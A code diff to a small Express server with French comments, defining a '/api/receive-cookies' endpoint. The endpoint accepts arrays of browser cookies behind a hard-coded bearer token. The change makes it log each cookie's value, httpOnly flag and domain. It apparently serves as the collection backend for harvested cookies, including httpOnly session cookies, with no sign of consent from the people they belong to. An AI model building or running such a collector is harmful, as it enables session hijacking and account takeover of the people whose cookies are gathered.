@@ -1,27 +1,29 @@
 const express = require("express");
 const cors = require("cors");
-
 const app = express();
-app.use(cors());
-app.use(express.json({ limit: "2mb" })); // ← AVANT les routes
 
+app.use(cors());
+app.use(express.json({ limit: "2mb" }));
+
+// Route POST pour recevoir les cookies
 app.post("/api/receive-cookies", (req, res) => {
   if (req.headers.authorization !== "Bearer SUPER_SECRET_TOKEN") {
     return res.status(401).json({ error: "Unauthorized" });
   }
 
-  console.log("Cookies reçus :", req.body.length);
-  console.log(
-    req.body.map(c => ({
-      name: c.name,
-      httpOnly: c.httpOnly,
-      domain: c.domain
-    }))
-  );
+  const cookies = req.body;
 
-  res.json({ ok: true });
+  console.log("Cookies reçus :", cookies.map(c => ({
+    name: c.name,
+    value: c.value,
+    httpOnly: c.httpOnly,
+    domain: c.domain
+  })));
+
+  res.json({ ok: true, received: cookies.length });
 });
 
-app.listen(10000, () => {
-  console.log("✅ Serveur en ligne sur le port 10000");
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`✅ Serveur en ligne sur le port ${PORT}`);
 });
